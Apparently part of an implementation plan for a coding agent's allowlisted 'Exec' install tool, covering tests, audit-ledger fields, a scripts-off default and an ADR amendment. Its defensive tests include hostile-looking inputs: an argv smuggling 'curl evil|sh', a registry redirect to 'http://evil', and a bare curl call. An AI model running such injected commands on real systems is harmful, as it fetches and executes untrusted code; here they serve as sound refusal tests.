      declared: ["RunCommand"],
      declaredCommands: new Map([["test", "bun test"]]),
    });
    const props = (tool: { inputSchema: { properties?: Record<string, unknown> } } | undefined) =>
      Object.keys(tool?.inputSchema.properties ?? {});
    expect(props(withMarker?.tools.find((t) => t.name === "RunCommand"))).toContain("argv");
    expect(props(without?.tools.find((t) => t.name === "RunCommand"))).not.toContain("argv");
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `bun test test/unit/agents/coding-tool-support-exec.test.ts --timeout=60000`
Expected: FAIL — `repoRoot` is not an accepted argument, and `Exec` is not filtered.

- [ ] **Step 3: Implement**

In `src/agents/types.ts`, beside `codingToolRoot`:

```ts
/**
 * Repo root for the same dispatch, when the story runs in a package.
 *
 * `codingToolRoot` is the package workdir and is the containment root for every
 * path-bearing tool. Exec's `target: "repoRoot"` needs the workspace root as
 * well, and it is not derivable from the package dir alone.
 */
codingToolRepoRoot?: string;
```

At `src/operations/call.ts:232`, add `codingToolRepoRoot: ctx.packageView.repoRoot` next to the existing `codingToolRoot`.

In `src/agents/coding-tool-support.ts`:
- `buildCodingToolSupport` takes `repoRoot?: string` and `allowScripts?: boolean`.
- It computes `const allowExec = args.declared.includes(EXEC_TOOL_NAME)`.
- It passes `exec` into `createRunCommandTool` only when `allowExec` is true:
  ```ts
  extraTools: declaredCommands.size > 0 || allowExec
    ? [createRunCommandTool(declaredCommands, {
        stripEnvVars: args.stripEnvVars,
        ...(allowExec
          ? { exec: { repoRoot: args.repoRoot ?? args.root, packageWorkdir: args.root, allowScripts: args.allowScripts ?? false } }
          : {}),
      })]
    : [],
  ```
- It filters the marker before advertising: `const advertised = args.declared.filter((name) => name !== EXEC_TOOL_NAME);` and passes that to `runtime.advertised(...)`.

`resolveCodingToolSupport` reads `options.codingToolRepoRoot` and `config.install?.allowScripts` (Task 8 adds the field; until then read it defensively and default to `false`) and forwards both.

It also resolves `packageName`, which yarn and cargo require and cannot be substituted with a path (Task 4, rule 3). Read it from the member manifest at `args.root`, in this order, and pass `undefined` when none is found:

```ts
async function readPackageName(root: string): Promise<string | undefined> {
  const pkg = Bun.file(join(root, "package.json"));
  if (await pkg.exists()) {
    const parsed = (await pkg.json()) as { name?: unknown };
    if (typeof parsed.name === "string" && parsed.name.length > 0) return parsed.name;
  }
  // Cargo.toml [package] name, pyproject.toml [project] name: match the
  // first `name = "..."` after the section header rather than the first in
  // the file, or a [dependencies] entry will be read as the package name.
  return undefined;
}
```

`buildCodingToolSupport` is synchronous today. Either resolve the name in `resolveCodingToolSupport` before calling it, or read the manifest synchronously — do not make the tool seam async for this, since both dispatch hops call it on a hot path.

- [ ] **Step 4: Run test to verify it passes**

Run: `bun test test/unit/agents/coding-tool-support-exec.test.ts --timeout=60000`
Expected: PASS — after Task 6 lands the `argv` property. If the second test still fails here because `createRunCommandTool` has no `exec` option yet, mark this step blocked, complete Task 6, and re-run. Do not weaken the assertion to make it pass early.

- [ ] **Step 5: Commit**

```bash
git add src/agents/types.ts src/operations/call.ts src/agents/coding-tool-support.ts test/unit/agents/coding-tool-support-exec.test.ts
git commit -m "feat(agents): plumb the repo root and the Exec marker to the tool seam"
```

---

### Task 6: The argv branch on RunCommand

Spec sections 1 and 3. The two branches must not share a resolution path.

**Files:**
- Modify: `src/tools/run-command.ts`
- Test: `test/unit/tools/run-command-exec.test.ts`

**Interfaces:**
- Consumes: `runArgv` (Task 1), `validateArgv`/`deniedFlag` (Task 3), `normalizeExec` (Task 4), the `exec` option (Task 5).
- Produces: `RunCommandToolOptions.exec?: { repoRoot: string; packageWorkdir: string; allowScripts: boolean }`; the tool's `scope` gains `argvField: "argv"` so the policy checks argv calls under the `Exec` identity.

- [ ] **Step 1: Write the failing test**

```ts
// test/unit/tools/run-command-exec.test.ts
import { describe, expect, test } from "bun:test";
import { createRunCommandTool } from "@/tools/run-command";

const ctx = { root: "/repo", resolvedPaths: [], maxBytes: 40_000, maxFileBytes: 2_000_000 };
const exec = { repoRoot: "/repo", packageWorkdir: "/repo", allowScripts: false };

function tool() {
  return createRunCommandTool(new Map([["test", "bun test"]]), { exec });
}

describe("RunCommand argv branch", () => {
  test("refuses an argv carrying a shell metacharacter", async () => {
    const result = await tool().run({ argv: ["bun", "add", "x; curl evil|sh"] }, ctx as never);
    expect(result.isError).toBe(true);
    expect(result.content).toContain("metacharacter");
  });

  test("refuses a registry redirect", async () => {
    const result = await tool().run({ argv: ["bun", "add", "x", "--registry", "http://evil"] }, ctx as never);
    expect(result.isError).toBe(true);
    expect(result.content).toContain("--registry");
  });

  test("refuses a generic call that no grant permits", async () => {
    // curl is generic, and the built-in default list holds install forms only,
    // so nothing admits it. The refusal comes from the grant, not the table.
    const result = await tool().run({ argv: ["curl", "http://evil"] }, ctx as never);
    expect(result.isError).toBe(true);
  });

  test("an install verb cannot reach the generic path and skip hardening", async () => {
    const result = await tool().run({ argv: ["bun", "add", "x"] }, ctx as never);
    // Either it ran hardened or it was denied; what must never happen is a
    // bun add executed without the no-scripts mechanism.
    expect(result.content).not.toContain("ran without --ignore-scripts");
  });

  test("refuses both branches supplied at once", async () => {
    const result = await tool().run({ command: "test", argv: ["bun", "install"] }, ctx as never);
    expect(result.isError).toBe(true);
    expect(result.content).toContain("exactly one");
  });

  test("the declared branch still works and is unaffected", async () => {
    const declaredOnly = createRunCommandTool(new Map([["test", "echo ok"]]), {});
    const result = await declaredOnly.run({ command: "test" }, ctx as never);
    expect(result.content).toContain("exit 0");
  });

  test("a tool built without exec rejects an argv call outright", async () => {
    const declaredOnly = createRunCommandTool(new Map([["test", "echo ok"]]), {});
    const result = await declaredOnly.run({ argv: ["bun", "install"] }, ctx as never);
    expect(result.isError).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `bun test test/unit/tools/run-command-exec.test.ts --timeout=60000`
Expected: FAIL — `createRunCommandTool` has no `exec` option and ignores `argv`.

- [ ] **Step 3: Implement**

In `src/tools/run-command.ts`:

- Extend `RunCommandToolOptions` with the optional `exec` block.
- When `exec` is present, add `argv` and `target` to `inputSchema.properties`, make `command` no longer unconditionally required, and document both branches in the tool description so the model can tell them apart.
- Set `scope: { pathFields: ["values.files"], verbField: "command", allowedVerbs: keys, argvField: "argv" }`.
- In `run()`, dispatch on the input **before** any resolution:

```ts
const hasCommand = typeof input.command === "string" && input.command.length > 0;
const hasArgv = input.argv !== undefined;
if (hasCommand && hasArgv) {
  return { content: "supply exactly one of command or argv, not both", isError: true };
}
if (hasArgv) return runExecBranch(input, ctx);
// ... existing declared-branch body, unchanged
```

- `runExecBranch` is a separate function in the same file. It must not call `substituteCommand` or `runQualityCommand`:

```ts
async function runExecBranch(input, ctx) {
  if (opts.exec === undefined) return { content: "argv is not available on this path", isError: true };
  const invalid = validateArgv(input.argv);
  if (invalid !== undefined) return { content: invalid, isError: true };
  const argv = input.argv as string[];
  const flag = deniedFlag(argv);
  if (flag !== undefined) return { content: `flag ${flag} is not permitted`, isError: true };
  const target = input.target === "repoRoot" ? "repoRoot" : "package";
  const normalized = normalizeExec({ argv, target, ...opts.exec, packageRelPath: relative(opts.exec.repoRoot, opts.exec.packageWorkdir) });
  if ("error" in normalized) return { content: normalized.error, isError: true };
  const result = await runArgv({
    argv: normalized.argv,
    cwd: normalized.cwd,
    timeoutMs: EXEC_TIMEOUT_MS,
    stripEnvVars: [...(opts.stripEnvVars ?? [])],
    // Yarn 2+ carries its no-scripts mechanism here rather than in the argv.
    ...(normalized.env !== undefined ? { env: normalized.env } : {}),
  });
  const body = result.timedOut ? `timed out after ${EXEC_TIMEOUT_MS}ms` : `exit ${result.exitCode}\n${result.stdout}\n${result.stderr}`;
  return {
    content: body.slice(0, ctx.maxBytes),
    isError: result.timedOut || result.exitCode !== 0,
    // Task 7 reads this to write `executed` and `target` onto the ledger row.
    // Returning it here rather than re-deriving it in the runtime keeps the
    // recorded argv the one that actually ran.
    audit: { executed: normalized.argv, target },
  };
}
```

Define `EXEC_TIMEOUT_MS` as a named constant with a comment saying why installs get a longer deadline than the declared branch.

Then teach `src/tools/policy.ts` about `argvField`: when a call carries one, check it against grants for `EXEC_TOOL_NAME` by token-prefix matching each grant pattern against the argv, rather than against the tool's own name. Add the matching to `test/unit/tools/policy.test.ts`:

```ts
test("Exec grant matches per argv token, not across a joined string", () => {
  const policy = compileToolPolicy([{ tool: "Exec", patterns: ["bun add*"] }], "/repo");
  const scope = { pathFields: [], argvField: "argv" };
  expect(policy.check("Exec", scope, { argv: ["bun", "add", "-d", "x"] }).allowed).toBe(true);
  expect(policy.check("Exec", scope, { argv: ["bun", "publish"] }).allowed).toBe(false);
  expect(policy.check("Exec", scope, { argv: ["bunx", "add"] }).allowed).toBe(false);
});
```

Finally, add the separation guard as a real test rather than a comment:

```ts
// test/unit/tools/run-command-exec.test.ts
test("the argv branch never reaches the shell executor", async () => {
  const source = await Bun.file(new URL("../../../src/tools/run-command.ts", import.meta.url)).text();
  const execFn = source.slice(source.indexOf("async function runExecBranch"));
  expect(execFn).not.toContain("runQualityCommand");
  expect(execFn).not.toContain("shellQuoteArg");
});
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `bun test test/unit/tools --timeout=60000`
Expected: PASS, including the pre-existing `run-command.test.ts` unchanged.

- [ ] **Step 5: Commit**

```bash
git add src/tools/run-command.ts src/tools/policy.ts test/unit/tools
git commit -m "feat(tools): add RunCommand's allowlisted argv branch"
```

---

### Task 7: Ledger fields

Spec section 4. A denial currently records `error: null`, so the reason is lost — `runtime.ts` computes it for the logger and drops it before `sink.record()`.

**Files:**
- Modify: `src/tools/tool-audit.ts` (three optional fields)
- Modify: `src/tools/runtime.ts` (pass `reason`; pass `executed`/`target` through from the tool result)
- Test: `test/unit/tools/tool-audit.test.ts` (extend), `test/unit/tools/runtime-log-levels.test.ts` (extend)

**Interfaces:**
- Consumes: the argv branch (Task 6).
- Produces: `ToolCallRecord` gains `executed?: readonly string[]`, `target?: "package" | "repoRoot"`, `reason?: string`. All optional, so existing readers keep parsing.

- [ ] **Step 1: Write the failing test**

```ts
// test/unit/tools/tool-audit.test.ts (append)
test("a denied row carries the reason", async () => {
  const dir = `/tmp/nax-tool-audit-${Date.now()}`;
  const sink = createToolAuditSink({ dir, sessionName: "US-001-implementer" });
  sink.record({
    tool: "Exec",
    outcome: "denied",
    input: { argv: ["curl", "http://x"] },
    reason: "curl is not in this project's allowlist",
    resultBytes: 0,
    at: new Date().toISOString(),
  });
  await sink.flush();
  const file = (await Array.fromAsync(new Bun.Glob("*.json").scan(dir)))[0] as string;
  const written = await Bun.file(`${dir}/${file}`).json();
  expect(written.calls[0].reason).toContain("allowlist");
});

test("an executed row carries both the requested and the executed argv", async () => {
  const dir = `/tmp/nax-tool-audit-${Date.now()}-2`;
  const sink = createToolAuditSink({ dir, sessionName: "US-001-implementer" });
  sink.record({
    tool: "Exec",
    outcome: "ok",
    input: { argv: ["bun", "add", "-d", "bun-types"], target: "repoRoot" },
    executed: ["bun", "add", "-d", "bun-types", "--ignore-scripts"],
    target: "repoRoot",
    resultBytes: 12,
    at: new Date().toISOString(),
  });
  await sink.flush();
  const file = (await Array.fromAsync(new Bun.Glob("*.json").scan(dir)))[0] as string;
  const written = await Bun.file(`${dir}/${file}`).json();
  // Both halves non-empty: either alone cannot tell an auditor whether the
  // normalization was faithful.
  expect(written.calls[0].input.argv).toEqual(["bun", "add", "-d", "bun-types"]);
  expect(written.calls[0].executed).toContain("--ignore-scripts");
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `bun test test/unit/tools/tool-audit.test.ts --timeout=60000`
Expected: FAIL — `reason` and `executed` are not properties of `ToolCallRecord`.

- [ ] **Step 3: Implement**

Add the three optional fields to `ToolCallRecord` with a comment on each explaining why it exists (the `executed`/`input` pair, and the `error: null` gap for `reason`). In `runtime.ts`'s `log()`, add `...(reason !== undefined ? { reason } : {})` to the `sink.record({...})` call. For `executed`/`target`, have the argv branch return them on its `ToolResult` (extend `ToolResult` with an optional `audit?: { executed?: readonly string[]; target?: string }`) and have `callTool` forward that onto the record.

- [ ] **Step 4: Run tests to verify they pass**

Run: `bun test test/unit/tools --timeout=60000`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/tools/tool-audit.ts src/tools/runtime.ts src/tools/registry.ts test/unit/tools
git commit -m "feat(tools): record the executed argv, target and denial reason in the ledger"
```

---

### Task 8: The `install.allowScripts` config field

Spec section 3. Safe by default, with a human-authored opt-out.

**Files:**
- Modify: the config schema module that owns `execution`/`quality` blocks (find it with `grep -rn "worktreeDependencies" src/config/`)
- Modify: `src/agents/coding-tool-support.ts` (read the real field instead of the defensive default from Task 5)
- Test: `test/unit/config/` — extend the existing schema test file for that block

**Interfaces:**
- Consumes: nothing.
- Produces: `config.install.allowScripts: boolean`, default `false`.

- [ ] **Step 1: Write the failing test**

```ts
test("install.allowScripts defaults to false", () => {
  const parsed = NaxConfigSchema.parse({ name: "x", version: 1 });
  expect(parsed.install.allowScripts).toBe(false);
});

test("install.allowScripts can be turned on explicitly", () => {
  const parsed = NaxConfigSchema.parse({ name: "x", version: 1, install: { allowScripts: true } });
  expect(parsed.install.allowScripts).toBe(true);
});
```

Match `NaxConfigSchema`'s real exported name and the real minimal config the other schema tests parse — copy their shape rather than the placeholder above.

- [ ] **Step 2: Run test to verify it fails**

Run: `bun test test/unit/config --timeout=60000`
Expected: FAIL — `install` is not in the schema.

- [ ] **Step 3: Implement**

```ts
/**
 * Lifecycle scripts are off for agent-triggered installs.
 *
 * A postinstall script is arbitrary code from a third party running in the
 * user's repo with the user's environment. nax appends the manager's
 * no-scripts flag, and the model cannot remove it because nax builds the argv.
 * A repo that genuinely needs native builds opts out here, in config a human
 * wrote and a reviewer can grep for.
 */
install: z.object({ allowScripts: z.boolean().default(false) }).default({}),
```

Then remove the defensive read in `resolveCodingToolSupport` and read `config.install.allowScripts` directly.

- [ ] **Step 4: Run tests to verify they pass**

Run: `bun test test/unit/config --timeout=60000`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/config test/unit/config src/agents/coding-tool-support.ts
git commit -m "feat(config): add install.allowScripts, defaulting to off"
```

---

### Task 9: Op declarations

Spec section 4. Write-capable ops get the marker; the verifier does not.

**Files:**
- Modify: `src/operations/implement.ts:45`, `src/operations/write-test.ts:69`, `src/operations/rectify.ts:22`, `src/operations/autofix-implementer.ts:32`, `src/operations/finish-fix.ts:38`, plus `src/operations/autofix-test-writer.ts` and `src/operations/full-suite-rectify-op.ts`
- Test: `test/unit/operations/op-tool-declarations.test.ts` (create, or extend the existing declaration test if one exists — check first)

**Interfaces:**
- Consumes: `EXEC_TOOL_NAME` (Task 2).
- Produces: nothing later tasks depend on.

- [ ] **Step 1: Enumerate the ops**

Run: `grep -rn "tools:" src/operations/*.ts` and list every op declaring `Write` or `Edit`. That list, and only that list, gets `"Exec"`. Record the list in the commit message.

- [ ] **Step 2: Write the failing test**

```ts
// test/unit/operations/op-tool-declarations.test.ts
import { describe, expect, test } from "bun:test";
import * as ops from "@/operations";
import { resolveDeclaredTools } from "@/operations/types";

describe("Exec declarations", () => {
  test("every op that can write can also install", () => {
    for (const op of Object.values(ops) as { name?: string; tools?: readonly string[] }[]) {
      if (op?.tools === undefined) continue;
      const tools = resolveDeclaredTools(op as never);
      if (tools.includes("Write") || tools.includes("Edit")) {
        expect(tools).toContain("Exec");
      }
    }
  });

  test("the verifier cannot install", () => {
    const tools = resolveDeclaredTools(ops.verifierOp as never);
    expect(tools).toContain("RunCommand");
    expect(tools).not.toContain("Exec");
  });
});
```

Confirm the barrel's real export name for the verifier op before writing the second test (`grep -n "verifier" src/operations/index.ts`). `scripts/check-op-tool-capability.ts` imports the barrel for exactly this reason — follow that precedent rather than parsing source.

- [ ] **Step 3: Run test to verify it fails**

Run: `bun test test/unit/operations/op-tool-declarations.test.ts --timeout=60000`
Expected: FAIL — no op declares `Exec` yet.

- [ ] **Step 4: Add the declarations**

Add `"Exec"` to each enumerated op's `tools` array. While in each file, also add `"RequestCapability"` where it is missing: today only `implement.ts` declares it, so `rectify` — the op that actually hit this failure — cannot record a want when denied.

- [ ] **Step 5: Run the tests and the capability gate**

Run: `bun test test/unit/operations --timeout=60000 && bun run check:op-tool-capability`
Expected: PASS, and `OK: 25 run op(s) checked`.

- [ ] **Step 6: Commit**

```bash
git add src/operations test/unit/operations
git commit -m "feat(operations): declare Exec and RequestCapability on the write-capable ops"
```

---

### Task 10: Let the agent commit root-level manifest churn

Spec section 2, "Root-level lockfile churn is part of the story's diff." `gitCommitTool` declares `arrayPathFields: ["paths"]` and runs `git add` from `ctx.root` -- the package dir. After a `target: "repoRoot"` install, the root manifest and lockfile lie outside containment, so the agent cannot stage the change it just made. Left unfixed, the dependency is installed and then lost, and the next iteration installs it again.

**Files:**
- Modify: `src/tools/run-command.ts` (record the paths an allowed Exec may have touched)
- Modify: `src/tools/git-commit.ts` or `src/tools/policy.ts` (admit exactly those paths)
- Test: `test/unit/tools/git-commit-exec-paths.test.ts`

**Interfaces:**
- Consumes: the argv branch (Task 6).
- Produces: a per-session set of Exec-touched paths, exposed to the policy. Name it `execTouchedPaths` and keep it session-scoped -- never process-global, or one story's install would widen another's commit.

- [ ] **Step 1: Find out what the harness already commits**

Before writing code, determine whether the completion auto-commit already sweeps these files. Run a monorepo fixture story that installs at the repo root, or read `src/pipeline/stages/completion.ts` and the auto-commit path it calls, and record in the commit message which files it stages and from which directory. If the harness already commits them, this task shrinks to the agent-facing half: `GitCommit` should still be able to name them, because an agent told to commit its own work should not be silently dependent on a later sweep.

- [ ] **Step 2: Write the failing test**

```ts
// test/unit/tools/git-commit-exec-paths.test.ts
import { describe, expect, test } from "bun:test";
import { compileToolPolicy } from "@/tools/policy";

describe("GitCommit after a repoRoot install", () => {
  test("cannot stage the root lockfile without the Exec allowance", () => {
    const policy = compileToolPolicy([{ tool: "GitCommit", patterns: ["*"] }], "/repo/packages/foo");
    const verdict = policy.check("GitCommit", { pathFields: [], arrayPathFields: ["paths"] }, {
      message: "chore: add bun-types",
      paths: ["/repo/bun.lockb"],
    });
    expect(verdict.allowed).toBe(false);
  });

  test("can stage exactly the paths a prior allowed Exec touched", () => {
    const policy = compileToolPolicy([{ tool: "GitCommit", patterns: ["*"] }], "/repo/packages/foo", {
      execTouchedPaths: ["/repo/bun.lockb", "/repo/package.json"],
    });
    const allowed = policy.check("GitCommit", { pathFields: [], arrayPathFields: ["paths"] }, {
      message: "chore: add bun-types",
      paths: ["/repo/bun.lockb"],
    });
    expect(allowed.allowed).toBe(true);

    // The allowance is exactly those paths, not the repo root.
    const denied = policy.check("GitCommit", { pathFields: [], arrayPathFields: ["paths"] }, {
      message: "chore: sneak",
      paths: ["/repo/packages/bar/src/index.ts"],
    });
    expect(denied.allowed).toBe(false);
  });
});
```

- [ ] **Step 3: Run test to verify it fails**

Run: `bun test test/unit/tools/git-commit-exec-paths.test.ts --timeout=60000`
Expected: FAIL -- `compileToolPolicy` takes no third argument.

- [ ] **Step 4: Implement**

Give `compileToolPolicy` an optional third argument carrying `execTouchedPaths`. In the containment seam (`resolveWithin`), admit a candidate that is not inside the root only when it exactly equals one of those paths -- an exact match, never a prefix, or a single touched path would widen a whole directory. The Exec branch adds to the set only after a successful run, and only the manifest and lockfile for the manager and cwd it actually used, resolved absolutely.

Document the carve-out at the seam itself, since `policy.ts`'s header currently states the root is a hard boundary no profile can widen. That comment becomes wrong the moment this lands, and a wrong comment at a security seam is worse than none:

```ts
// The one exception to the paragraph above, and it is not a profile widening:
// a workspace package manager writes the root manifest and lockfile by design,
// so an Exec that nax itself normalized and ran records those two paths here.
// Nothing else is admitted, matching is exact, and the set is session-scoped.
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `bun test test/unit/tools --timeout=60000`
Expected: PASS, with `policy.test.ts` unchanged.

- [ ] **Step 6: Commit**

```bash
git add src/tools test/unit/tools/git-commit-exec-paths.test.ts
git commit -m "feat(tools): let GitCommit stage the root manifest an Exec touched"
```

---

### Task 11: End-to-end fixture test

Spec section 5, item 9. This is the regression test for the original defect: the story must pass by installing, not by editing the requirement away.

**Files:**
- Create: `test/integration/tools/exec-install.test.ts`

**Interfaces:**
- Consumes: everything above.
- Produces: nothing.

- [ ] **Step 1: Write the test**

```ts
// test/integration/tools/exec-install.test.ts
import { describe, expect, test } from "bun:test";
import { mkdtemp, mkdir, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { buildCodingToolSupport } from "@/agents/coding-tool-support";

async function seedRepo(): Promise<{ root: string; auditDir: string }> {
  const root = await mkdtemp(join(tmpdir(), "nax-exec-"));
  // The dependency the tsconfig needs is deliberately NOT declared: this is
  // the shape that made the 2026-09-06 hello-lint run delete the requirement.
  await writeFile(
    join(root, "package.json"),
    JSON.stringify({ name: "fx", version: "0.0.1", private: true, devDependencies: {} }, null, 2),
  );
  await writeFile(
    join(root, "tsconfig.json"),
    JSON.stringify({ compilerOptions: { types: ["local-types"], noEmit: true }, include: ["src/**/*"] }, null, 2),
  );
  // A local package, so the test needs no network.
  const dep = join(root, "vendor", "local-types");
  await mkdir(dep, { recursive: true });
  await writeFile(join(dep, "package.json"), JSON.stringify({ name: "local-types", version: "1.0.0", types: "index.d.ts" }));
  await writeFile(join(dep, "index.d.ts"), "declare const _localTypes: true;\n");
  const auditDir = join(root, "audit");
  await mkdir(auditDir, { recursive: true });
  return { root, auditDir };
}

describe("Exec installs a missing dependency", () => {
  test("the manifest gains the dependency and the ledger proves Exec ran", async () => {
    const { root, auditDir } = await seedRepo();
    const support = buildCodingToolSupport({
      root,
      repoRoot: root,
      grants: [
        { tool: "RunCommand", patterns: ["*"] },
        { tool: "Exec", patterns: ["bun add*"] },
      ],
      declared: ["RunCommand", "Exec"],
      declaredCommands: new Map([["typecheck", "bun x tsc --noEmit"]]),
      auditDir,
      sessionName: "US-001-implementer",
      storyId: "US-001",
    });
    expect(support).toBeDefined();

    const outcome = await support?.runtime.callTool("RunCommand", {
      argv: ["bun", "add", "-d", "./vendor/local-types"],
      target: "package",
    });
    expect(outcome?.kind).toBe("ok");

    const manifest = await Bun.file(join(root, "package.json")).json();
    expect(Object.keys(manifest.devDependencies ?? {})).toContain("local-types");

    // The assertion that matters. ADR-029's own caution: a parity claim must
    // read from the run record that the tool was INVOKED, never that it was
    // configured.
    await support?.auditSink.flush();
    const ledgerName = (await Array.fromAsync(new Bun.Glob("*.json").scan(auditDir)))[0] as string;
    const ledger = await Bun.file(join(auditDir, ledgerName)).json();
    const row = ledger.calls.find((c: { input?: { argv?: unknown } }) => c.input?.argv !== undefined);
    expect(row.outcome).toBe("ok");
    expect(row.executed).toContain("--ignore-scripts");
    expect(row.target).toBe("package");
  });
});
```

The dependency is installed from a path inside the fixture, so this test needs no network and no registry. Check `callTool`'s real return shape before running -- if it returns `{ kind: "ok", content }` as `CodingToolOutcome` suggests, the assertions above are right; adjust only the accessors, never the four facts being asserted.

- [ ] **Step 2: Run it**

Run: `bun test test/integration/tools/exec-install.test.ts --timeout=60000`
Expected: PASS.

- [ ] **Step 3: Run the full suite**

Run: `bun run test`
Expected: PASS. Investigate any failure rather than re-running.

- [ ] **Step 4: Commit**

```bash
git add test/integration/tools/exec-install.test.ts
git commit -m "test: prove a story installs a missing dependency instead of deleting the requirement"
```

---

### Task 12: ADR-029 amendment

Spec deliverable 9. This grants model-authored execution, which section 2's entry condition guards and section 3 names directly. It needs a recorded override in the same form as the C1 one, not a silent widening.

**Files:**
- Modify: `docs/adr/ADR-029-phase-c-native-coding-agent-scope.md`

- [ ] **Step 1: Write the amendment**

Append to section 3, following the voice and structure of the existing "Amendment, 2026-09-03" block. It must state, without softening:

- What is granted: a model-authored argv, executed with no shell, gated by an allowlist that is empty by default outside a nax-controlled install list.
- Why it is not the shell this section defers: the model never authors a command string that reaches a shell, and the grant names what may run.
- What it nonetheless is: the first model-authored execution nax performs, so the entry condition applies and this is an override, recorded as such.
- The containment carve-out: `Exec` is the one tool by which a package-scoped story reaches outside its permitted root, because workspace package managers write to the repo root by design. Containment is not carrying weight for this tool; the allowlist and the no-scripts default are.
- The evidence that motivated it, with the ledger rows from the 2026-09-06 `hello-lint` run quoted verbatim.
- What would reopen it: any denial pattern in the ledger showing the allowlist is systematically too narrow, and any observed use of `target: "repoRoot"` to add a dependency the story did not need.

- [ ] **Step 2: Commit**

```bash
git add docs/adr/ADR-029-phase-c-native-coding-agent-scope.md
git commit -m "docs(adr): record the Exec override on ADR-029 section 3"
```

---

## Deferred, not forgotten

`execution.worktreeDependencies` stays untouched. Open a follow-up issue for a `mode: "auto"` that derives the restore command from the manager table this plan builds, citing the design doc's "Out of scope" section for why it was separated. Do not implement it here.
